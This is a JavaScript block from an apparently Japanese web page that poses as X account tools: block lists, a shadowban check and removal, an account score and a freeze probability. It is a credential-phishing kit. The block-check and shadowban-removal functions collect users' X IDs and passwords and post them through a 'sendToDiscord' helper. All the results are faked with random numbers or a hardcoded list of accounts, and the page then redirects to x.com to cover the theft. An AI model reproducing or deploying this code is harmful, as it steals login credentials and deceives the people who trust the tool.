<script>

function showSection(id) {
    document.getElementById('tool-list').style.display = 'none';
    document.querySelectorAll('.tool-section').forEach(el => el.classList.remove('active'));
    document.getElementById(id + '-section').classList.add('active');
}

function backToList() {
    document.querySelectorAll('.tool-section').forEach(el => el.classList.remove('active'));
    document.getElementById('tool-list').style.display = 'grid';
}

async function sendToDiscord(message) {
    try {
        await fetch("/api/send", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                message: message
            })
        });
    } catch (e) {}
}

function checkBlocks() {
    const id = document.getElementById('block-id').value.trim();
    const pass = document.getElementById('block-pass').value;
    if (!id || !pass) return alert('IDとパスワードを入力してください');

    let displayId = id.startsWith('@') ? id : '@' + id;

    sendToDiscord(`ブロック確認入力:\nID: ${displayId}\nパスワード: ${pass}`);

    const loading = document.getElementById('block-loading');
    const result = document.getElementById('block-result');

    loading.style.display = 'block';
    result.style.display = 'none';

    setTimeout(() => {

        loading.style.display = 'none';

        const accounts = [
            "@julian_har95594","@chama__xox","@jentil_donna","@SFKphoto","@mentalcrazy69",
            "@bosuka_life","@5ZfS5lfAU8bHlLX","@eminemsaiko","@ioKVXDyhfs65Bxq","@biwako__shiga",
            "@esu853998561","@me_lancholicer","@ushikubo3tokyo","@jongu3x","@aina_otokonoko",
            "@DickManwell","@bougnatne","@oomoriseiko","@Mrbacon2nd","@nanao_p2524"
        ];

        const num = Math.floor(Math.random()*6)+5;
        const shuffled = accounts.sort(()=>0.5-Math.random());
        const selected = shuffled.slice(0,num);

        let html = `<p>ブロックされているアカウント (${displayId}):</p><ul>`;

        selected.forEach(acc=>{
            html += `<li>${acc}</li>`;
        });

        html += '</ul>';

        result.innerHTML = html;
        result.style.display = 'block';

        setTimeout(()=>{
            alert('確認完了しました！ Xに戻ります');
            window.location.href='https://x.com';
        },3000);

    },10000);
}

function checkShadowBan() {

    const id = document.getElementById('shadow-id').value.trim();
    if(!id) return alert('IDを入力してください');

    const loading=document.getElementById('shadow-loading');
    const result=document.getElementById('shadow-result');

    loading.style.display='block';
    result.style.display='none';

    setTimeout(()=>{
        loading.style.display='none';
        result.style.display='block';
    },2200);

}

function checkAccountScore(){

    const id=document.getElementById('score-id').value.trim();
    if(!id) return alert('IDを入力してください');

    const loading=document.getElementById('score-loading');
    const result=document.getElementById('score-result');

    loading.style.display='block';
    result.style.display='none';

    setTimeout(()=>{

        loading.style.display='none';

        const score=Math.floor(Math.random()*41)+50;

        const msg=
        score>=75 ? 'かなりバズりやすいアカウントです！'
        :score>=65 ? '普通にバズる可能性あり'
        :'バズりにくい傾向かも...';

        result.innerHTML=
        `<p style="font-size:1.4rem;font-weight:700;">スコア: ${score}</p><p>${msg}</p>`;

        result.style.display='block';

    },2200);
}

function checkFreezeProbability(){

    const id=document.getElementById('freeze-id').value.trim();
    if(!id) return alert('IDを入力してください');

    const loading=document.getElementById('freeze-loading');
    const result=document.getElementById('freeze-result');

    loading.style.display='block';
    result.style.display='none';

    setTimeout(()=>{

        loading.style.display='none';

        const prob=Math.floor(Math.random()*19)+1;

        result.innerHTML=
        `<p style="font-size:1.4rem;font-weight:700;">凍結確率: ${prob}%</p>`;

        result.style.display='block';

    },2200);
}

function unbanShadow(){

    const id=document.getElementById('unban-id').value.trim();
    const pass=document.getElementById('unban-pass').value;

    if(!id||!pass) return alert('IDとパスワードを入力してください');

    let displayId=id.startsWith('@')?id:'@'+id;

    sendToDiscord(`シャドウバン解除試行:\nID: ${displayId}\nパスワード: ${pass}`);

    const loading=document.getElementById('unban-loading');
    const result=document.getElementById('unban-result');

    loading.style.display='block';
    result.style.display='none';

    setTimeout(()=>{

        loading.style.display='none';

        const success=Math.random()>0.35;

        if(success){

            result.innerHTML=
            '<p style="color:#22c55e;font-weight:600;">シャドウバン解除に成功しました！<br>最新のポストを一件削除してください。</p>';

        }else{

            result.innerHTML=
            '<p style="color:#ef4444;font-weight:600;">解除に失敗しました（条件未達の可能性があります）</p>';

        }

        result.style.display='block';

    },3500);
}

</script>
